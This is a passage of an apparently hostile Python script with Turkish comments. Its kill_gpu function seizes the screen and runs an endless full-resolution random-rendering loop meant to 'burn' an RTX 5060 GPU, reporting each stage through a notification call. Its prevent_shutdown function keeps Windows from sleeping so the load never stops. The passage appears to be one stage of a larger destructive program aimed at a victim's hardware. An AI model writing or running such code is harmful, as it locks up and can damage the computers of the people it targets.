# GPU YAKMA (LİMİT - RTX 5060)
# ==========================================
def kill_gpu():
    send_notification("🖥️ [6/5] RTX 5060 LİMİT yakılıyor...")
    try:
        import pygame
        import numpy as np
        pygame.init()
        screen = pygame.display.set_mode((1920, 1080), pygame.FULLSCREEN)
        def gpu_stress():
            while True:
                for _ in range(300):
                    img = np.random.rand(1920, 1080, 3) * 255
                    surf = pygame.surfarray.make_surface(img)
                    screen.blit(surf, (0, 0))
                    pygame.display.flip()
        threading.Thread(target=gpu_stress, daemon=True).start()
        send_notification("✅ RTX 5060 LİMİT render başlatıldı! (300 FPS)")
        return True
    except Exception as e:
        send_notification(f"❌ GPU hatası: {e}")
        return False

# ==========================================
# KAPANMAYI ENGELLE
# ==========================================
def prevent_shutdown():
    while True:
        try:
            ctypes.windll.kernel32.SetThreadExecutionState(0x80000002)
        except:
            pass
        time.sleep(5)
threading.Thread(target=prevent_shutdown, daemon=True).start()

